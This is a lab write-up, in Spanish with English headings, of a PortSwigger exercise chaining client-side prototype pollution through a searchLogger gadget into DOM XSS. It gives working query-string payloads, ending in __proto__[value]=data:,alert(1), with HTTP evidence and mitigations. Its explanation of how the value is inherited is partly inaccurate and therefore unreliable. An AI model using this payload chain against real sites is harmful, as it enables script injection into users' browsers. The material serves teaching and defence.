@@ -1,0 +1,606 @@
+Client-Side Prototype Pollution via Browser APIs
+
+Lab: Client-side prototype pollution via browser APIs
+Category: Prototype Pollution / DOM XSS
+Difficulty: Practitioner
+Platform: PortSwigger Web Security Academy
+
+Executive Summary
+
+La aplicación era vulnerable a client-side prototype pollution, permitiendo modificar propiedades de Object.prototype mediante parámetros controlados por el usuario incluidos en la URL.
+
+Durante el análisis se identificó que el parámetro search de la URL era procesado mediante una función de deserialización (deparam) que permitía utilizar la sintaxis __proto__ para añadir propiedades al prototipo global Object.prototype.
+
+Posteriormente se identificó un gadget en el código JavaScript de la aplicación. La función searchLogger() creaba un objeto config con una propiedad transport_url aparentemente protegida mediante Object.defineProperty().
+
+Sin embargo, la propiedad se definía sin especificar un value. Esto permitió que su valor fuese heredado desde Object.prototype.
+
+Al contaminar:
+
+Object.prototype.value
+
+con un valor controlado por el atacante, la aplicación utilizó dicho valor como script.src.
+
+Finalmente, se utilizó un data: URL para ejecutar JavaScript y provocar:
+
+alert(1)
+
+demostrando la explotación de la vulnerabilidad y resolviendo el laboratorio.
+
+Vulnerability Classification
+Attribute	Value
+Vulnerability	Client-Side Prototype Pollution
+Impact	DOM-based XSS
+CWE	CWE-1321 – Improperly Controlled Modification of Object Prototype Attributes
+OWASP	A03:2021 – Injection
+Severity	High
+Attack Vector	URL query string
+Authentication	Not required
+Target
+
+Application: PortSwigger Web Security Academy Lab
+
+Affected functionality:
+
+Search / Query parameter processing
+
+Relevant JavaScript:
+
+searchLogger()
+Objective
+
+El objetivo del laboratorio era:
+
+Encontrar una fuente de prototype pollution.
+Identificar un gadget que pudiera utilizar una propiedad contaminada.
+Encadenar ambos elementos.
+Conseguir ejecución de JavaScript mediante:
+alert(1)
+Methodology
+
+La explotación se realizó siguiendo estas fases:
+
+Identificación de la fuente de prototype pollution.
+Confirmación de la contaminación de Object.prototype.
+Análisis del JavaScript de la aplicación.
+Identificación del gadget transport_url.
+Análisis del uso de Object.defineProperty().
+Descubrimiento de la propiedad heredada value.
+Inyección de un valor controlado mediante __proto__.
+Utilización de un data: URL como script.src.
+Ejecución de JavaScript mediante alert(1).
+1. Identificación de la Prototype Pollution Source
+
+La primera fase consistió en determinar si los parámetros de la URL podían modificar propiedades del prototipo global.
+
+Se utilizó el siguiente payload:
+
+/?__proto__[foo]=bar
+
+La aplicación procesaba los parámetros de la URL mediante la función deparam.
+
+Posteriormente, desde la consola de DevTools se ejecutó:
+
+Object.prototype
+
+Se observó que el objeto contenía la propiedad:
+
+foo: "bar"
+
+Esto confirmó que era posible modificar Object.prototype desde un parámetro controlado por el usuario.
+
+Por tanto, se había identificado una fuente de client-side prototype pollution.
+
+2. Análisis del Gadget
+
+Una vez identificada la fuente, se analizaron los archivos JavaScript cargados por la aplicación.
+
+En particular, se encontró la siguiente función:
+
+async function searchLogger() {
+    let config = {
+        params: deparam(new URL(location).searchParams.toString()),
+        transport_url: false
+    };
+
+    Object.defineProperty(config, 'transport_url', {
+        configurable: false,
+        writable: false
+    });
+
+    if(config.transport_url) {
+        let script = document.createElement('script');
+        script.src = config.transport_url;
+        document.body.appendChild(script);
+    }
+
+    if(config.params && config.params.search) {
+        await logQuery('/logger', config.params);
+    }
+}
+
+El código resultó especialmente interesante por la siguiente sección:
+
+if(config.transport_url) {
+    let script = document.createElement('script');
+    script.src = config.transport_url;
+    document.body.appendChild(script);
+}
+
+El valor de config.transport_url se utilizaba directamente como:
+
+script.src
+
+Esto constituye un posible DOM XSS sink.
+
+3. Análisis de Object.defineProperty()
+
+A primera vista, el código parecía proteger transport_url:
+
+Object.defineProperty(config, 'transport_url', {
+    configurable: false,
+    writable: false
+});
+
+Sin embargo, existe un detalle importante.
+
+La definición no especifica:
+
+value: ...
+
+Por tanto, la propiedad se crea con su valor por defecto:
+
+undefined
+
+Además, la propiedad se establece como:
+
+writable: false
+
+y:
+
+configurable: false
+
+Esto aparentemente evita modificarla directamente.
+
+Sin embargo, la propiedad no deja de participar en la resolución de propiedades del objeto. El valor puede proceder del prototipo cuando la propia propiedad no proporciona un valor útil.
+
+Esto permite aprovechar una propiedad heredada desde:
+
+Object.prototype
+4. Identificación del Gadget value
+
+Se probó la contaminación de otra propiedad:
+
+/?__proto__[value]=foo
+
+Esto provoca conceptualmente:
+
+Object.prototype.value = "foo";
+
+El objeto config puede entonces obtener el valor contaminado mediante la cadena de prototipos.
+
+Cuando el código ejecuta:
+
+script.src = config.transport_url;
+
+el valor controlado por el atacante puede terminar siendo utilizado como origen del script.
+
+Esto conecta la vulnerabilidad de prototype pollution con el sink:
+
+script.src
+
+Por tanto, el flujo de explotación es:
+
+URL
+ │
+ ▼
+__proto__[value]
+ │
+ ▼
+Object.prototype.value
+ │
+ ▼
+config.transport_url
+ │
+ ▼
+script.src
+ │
+ ▼
+JavaScript execution
+5. Prueba de Concepto
+
+Para comprobar que el valor contaminado podía llegar al atributo src, se utilizó:
+
+/?__proto__[value]=foo
+
+Al inspeccionar el DOM mediante DevTools se observó la creación de un elemento:
+
+<script src="foo"></script>
+
+Esto confirmó que el valor controlado mediante prototype pollution estaba alcanzando el sink script.src.
+
+6. Explotación mediante data: URL
+
+Una vez confirmado el flujo de datos, se sustituyó el valor de prueba por un data: URL capaz de ejecutar JavaScript:
+
+/?__proto__[value]=data:,alert(1);
+
+El navegador interpretó el valor como el origen del elemento <script>.
+
+Conceptualmente, la aplicación terminó generando:
+
+<script src="data:,alert(1);"></script>
+
+El navegador cargó el recurso y ejecutó:
+
+alert(1)
+
+La aparición del diálogo confirmó la ejecución de JavaScript.
+
+El laboratorio quedó resuelto.
+
+Exploit
+
+Payload utilizado:
+
+/?__proto__[value]=data:,alert(1);
+
+El flujo completo de explotación fue:
+
+__proto__[value]
+        │
+        ▼
+Object.prototype.value
+        │
+        ▼
+config.transport_url
+        │
+        ▼
+script.src
+        │
+        ▼
+data:,alert(1);
+        │
+        ▼
+JavaScript execution
+Technical Analysis
+
+La vulnerabilidad depende de la combinación de dos elementos independientes.
+
+Source
+
+La función:
+
+deparam()
+
+permite interpretar parámetros como:
+
+__proto__[value]
+
+y modificar:
+
+Object.prototype
+Gadget
+
+La función:
+
+searchLogger()
+
+contiene:
+
+if(config.transport_url) {
+    let script = document.createElement('script');
+    script.src = config.transport_url;
+    document.body.appendChild(script);
+}
+
+El valor utilizado por el gadget puede verse afectado por la contaminación del prototipo.
+
+Sink
+
+El sink final es:
+
+script.src = config.transport_url;
+
+ya que permite que un valor controlado por el atacante determine qué recurso JavaScript se carga.
+
+Vulnerable Data Flow
+Attacker-controlled URL
+        │
+        │ __proto__[value]
+        ▼
+     deparam()
+        │
+        ▼
+Object.prototype.value
+        │
+        ▼
+   config object
+        │
+        ▼
+config.transport_url
+        │
+        ▼
+document.createElement('script')
+        │
+        ▼
+      script.src
+        │
+        ▼
+   JavaScript execution
+Root Cause
+
+La causa principal de la vulnerabilidad es la combinación de:
+
+Deserialización insegura de parámetros controlados por el usuario.
+Posibilidad de modificar Object.prototype.
+Uso de propiedades heredadas de objetos contaminados.
+Uso de un valor controlable por el atacante como script.src.
+
+La aplicación no valida adecuadamente los nombres de las propiedades durante la deserialización.
+
+En particular, permite procesar una estructura como:
+
+__proto__[value]=...
+
+que termina afectando al prototipo global.
+
+Why the Patch Failed
+
+Los desarrolladores intentaron proteger el gadget mediante:
+
+Object.defineProperty(config, 'transport_url', {
+    configurable: false,
+    writable: false
+});
+
+Sin embargo, la protección no fue suficiente.
+
+El problema es que la propiedad fue definida sin proporcionar explícitamente un valor:
+
+value: ...
+
+La ausencia de un valor permitió que la resolución de propiedades siguiera siendo relevante en combinación con la contaminación del prototipo.
+
+Por tanto, aunque:
+
+writable: false
+
+impedía modificar directamente la propiedad, no solucionaba el problema fundamental de confiar en propiedades heredadas de un prototipo potencialmente contaminado.
+
+Impact
+
+Un atacante podría utilizar una vulnerabilidad de este tipo para conseguir:
+
+Ejecución arbitraria de JavaScript.
+DOM XSS.
+Manipulación del contenido de la página.
+Acceso a información disponible para JavaScript en el contexto de la aplicación.
+Ejecución de acciones en nombre del usuario afectado, dependiendo de los controles existentes.
+Encadenamiento con otras vulnerabilidades para aumentar el impacto.
+
+El impacto exacto depende de qué información y funcionalidades estén disponibles en el contexto de la víctima.
+
+Attack Flow
+1. Attacker controls URL parameters
+              │
+              ▼
+2. Injects __proto__[value]
+              │
+              ▼
+3. deparam() processes the parameter
+              │
+              ▼
+4. Object.prototype is polluted
+              │
+              ▼
+5. config consumes inherited value
+              │
+              ▼
+6. Value reaches config.transport_url
+              │
+              ▼
+7. Application creates <script>
+              │
+              ▼
+8. script.src uses attacker-controlled value
+              │
+              ▼
+9. data: URL executes JavaScript
+              │
+              ▼
+10. alert(1)
+HTTP Evidence
+Prototype Pollution Test
+GET /?__proto__[foo]=bar HTTP/2
+Host: LAB-ID.web-security-academy.net
+
+Resultado conceptual:
+
+Object.prototype.foo === "bar"
+
+Esto confirmó la existencia de una fuente de prototype pollution.
+
+Gadget Test
+GET /?__proto__[value]=foo HTTP/2
+Host: LAB-ID.web-security-academy.net
+
+El DOM terminó conteniendo un elemento equivalente a:
+
+<script src="foo"></script>
+
+Esto confirmó que value podía alcanzar el sink script.src.
+
+Final Exploit
+GET /?__proto__[value]=data:,alert(1); HTTP/2
+Host: LAB-ID.web-security-academy.net
+
+Resultado:
+
+alert(1)
+
+La ejecución del JavaScript confirmó la explotación.
+
+Security Recommendations
+1. Evitar la Prototype Pollution durante la Deserialización
+
+Las funciones que convierten parámetros en objetos deben rechazar propiedades peligrosas como:
+
+__proto__
+constructor
+prototype
+
+Debe utilizarse una allowlist de propiedades cuando sea posible.
+
+2. No Modificar Objetos Globales
+
+El código de la aplicación no debería permitir que datos procedentes del usuario puedan modificar:
+
+Object.prototype
+3. Utilizar Objetos sin Prototipo cuando Sea Apropiado
+
+Para almacenar datos procedentes del usuario puede utilizarse:
+
+Object.create(null)
+
+Esto evita la existencia de una cadena de prototipos convencional.
+
+4. No Utilizar Propiedades Heredadas para Decisiones de Seguridad
+
+Cuando una propiedad debe proceder exclusivamente de datos definidos explícitamente en el objeto, debe comprobarse su existencia directa:
+
+Object.hasOwn(config, 'transport_url')
+
+en lugar de depender únicamente de:
+
+config.transport_url
+5. Definir Explícitamente los Valores de las Propiedades
+
+La protección existente debería definir claramente el valor de la propiedad:
+
+Object.defineProperty(config, 'transport_url', {
+    value: false,
+    configurable: false,
+    writable: false
+});
+
+Esto evita depender de valores heredados.
+
+6. Validar los Valores Utilizados como script.src
+
+Los valores utilizados para cargar scripts deberían proceder exclusivamente de fuentes confiables.
+
+Debe evitarse aceptar directamente valores controlados por el usuario como:
+
+script.src = userControlledValue;
+
+Además, deberían aplicarse restricciones sobre esquemas y orígenes permitidos.
+
+7. Implementar Content Security Policy
+
+Una política CSP restrictiva puede reducir el impacto de determinadas formas de XSS.
+
+Por ejemplo:
+
+Content-Security-Policy: script-src 'self'
+
+La configuración exacta debe adaptarse a las necesidades de la aplicación.
+
+Recommended Secure Implementation
+
+Una implementación más segura podría evitar completamente la dependencia de propiedades heredadas:
+
+let config = {
+    params: deparam(new URL(location).searchParams.toString()),
+    transport_url: false
+};
+
+Object.defineProperty(config, 'transport_url', {
+    value: false,
+    configurable: false,
+    writable: false
+});
+
+if (
+    Object.hasOwn(config, 'transport_url') &&
+    config.transport_url
+) {
+    let script = document.createElement('script');
+
+    // Only allow trusted script URLs.
+    script.src = config.transport_url;
+
+    document.body.appendChild(script);
+}
+
+Sin embargo, la corrección principal debe realizarse en la fuente de la contaminación: el procesamiento de parámetros controlados por el usuario.
+
+Vulnerability Chain
+
+La vulnerabilidad puede resumirse como:
+
+Prototype Pollution
+        +
+Insecure Property Resolution
+        +
+DOM XSS Gadget
+        =
+JavaScript Execution
+
+En este caso concreto:
+
+__proto__[value]
+        ↓
+Object.prototype.value
+        ↓
+config.transport_url
+        ↓
+script.src
+        ↓
+data:,alert(1)
+        ↓
+DOM XSS
+Key Technical Findings
+Source
+?__proto__[value]=...
+Pollution Target
+Object.prototype
+Gadget
+config.transport_url
+Sink
+script.src
+Payload
+/?__proto__[value]=data:,alert(1);
+Result
+alert(1)
+Conclusion
+
+La aplicación era vulnerable a client-side prototype pollution debido a que permitía modificar Object.prototype mediante parámetros controlados por el usuario.
+
+La vulnerabilidad se volvió explotable al identificar el gadget existente en searchLogger(). Aunque los desarrolladores habían intentado proteger transport_url mediante Object.defineProperty(), la propiedad se definió sin un valor explícito y podía verse afectada por la contaminación del prototipo.
+
+El valor contaminado alcanzaba finalmente:
+
+script.src
+
+permitiendo utilizar un data: URL para ejecutar JavaScript arbitrario.
+
+El payload final:
+
+/?__proto__[value]=data:,alert(1);
+
+provocó la ejecución de:
+
+alert(1)
+
+y permitió resolver el laboratorio.
+
+Key Takeaways
+La prototype pollution en JavaScript del lado cliente puede convertirse en DOM XSS cuando existe un gadget adecuado.
+Los parámetros __proto__, constructor y prototype deben tratarse como propiedades peligrosas durante la deserialización.
+Object.defineProperty() no constituye por sí mismo una protección contra prototype pollution.
+Las propiedades heredadas pueden ser peligrosas cuando se utilizan en operaciones sensibles.
+Los valores controlados por el usuario nunca deberían llegar directamente a sinks como:
+script.src
+Para analizar este tipo de vulnerabilidades es fundamental identificar la cadena:
+Source → Prototype Pollution → Gadget → Sink
